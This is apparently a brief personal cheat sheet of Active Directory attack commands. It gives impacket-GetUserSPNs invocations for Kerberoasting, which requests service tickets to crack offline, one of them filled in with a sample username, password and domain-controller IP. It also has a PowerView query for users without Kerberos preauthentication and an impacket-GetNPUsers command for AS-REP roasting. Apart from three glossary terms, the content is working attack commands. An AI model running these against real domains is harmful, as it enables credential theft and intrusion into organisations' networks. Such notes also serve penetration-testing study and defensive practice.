# Active Directory & Domain Controller

```
impacket-GetUserSPNs domain-name/domain-user:password -dc-ip x.x.x.x -request
```

```
impacket-GetUserSPNs xyz.com/alice:bubbles -dc-ip 192.168.111.155 -request
```

![[Pasted image 20230906222705.png]]

*Service Principal Name (SPN)*

*Ticket Granting Service (TGS)*

*Ticket Granting Ticket (TGT)*

### List vuln users using PowerView

```
Get-DomainUser -PreauthNotRequired -verbose
```

```
impacket-GetNPUsers $domain-name/ -dc-ip $ip -usersfile usernames.txt
```

